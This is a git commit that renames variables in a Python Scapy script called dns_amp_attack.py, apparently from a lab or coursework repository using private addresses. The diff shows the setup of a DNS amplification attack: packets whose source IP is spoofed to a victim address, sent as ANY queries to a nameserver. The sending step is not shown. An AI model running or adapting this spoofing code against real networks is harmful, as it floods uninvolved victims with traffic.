2c5f9a70ab744a33a70e46d5d1a425775a2638c5
mstachow97 <92484737+mstachow97@users.noreply.github.com>
2021-10-26 22:25:04 +0200

    Rename the variables

--- python_scripts/dns_amp_attack.py
+++ python_scripts/dns_amp_attack.py
@@ -2,11 +2,11 @@
 
 from scapy.all import *
 
-target = '192.168.27.11'
-nameserver = '192.168.27.9'
+victim_addr = '192.168.27.11'
+dns_server_addr = '192.168.27.9'
 domain = 'ddos.edu'
 
-ip = IP(src=target, dst=nameserver)
+ip = IP(src=victim_addr, dst=dns_server_addr)
 udp = UDP(dport=53)
 dns = DNS(rd=1, qdcount=1, qd=DNSQR(qname=domain, qtype=255))
 
